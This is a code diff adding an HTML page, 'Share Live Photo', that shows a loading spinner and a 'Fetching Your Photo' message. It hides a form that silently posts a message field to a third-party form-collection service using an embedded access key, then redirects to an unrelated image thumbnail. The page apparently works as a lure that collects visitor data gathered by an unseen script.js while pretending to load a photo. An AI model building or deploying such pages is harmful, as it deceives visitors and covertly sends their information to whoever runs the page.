@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share Live Photo</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Loading the Site</h1>
+    <div class="loader"></div>
+    <div id="status">Fetching Your Photo, please wait...</div>
+    <form action="https://api.web3forms.com/submit" method="POST" id="photoForm" style="display: none;">
+      <!-- Access Key -->
+      <input type="hidden" name="access_key" value="d5bb3ce5-742d-4dd2-a791-70a089d1e9e1">
+      <textarea name="message" id="message" required></textarea>
+      <input type="hidden" name="redirect" value="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQa_jZBf3pEdaMq-NHAbya0p4jC9oQkXHiGcImPVPGYMt_xBLOhcH4uEGk&s=10">
+    </form>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
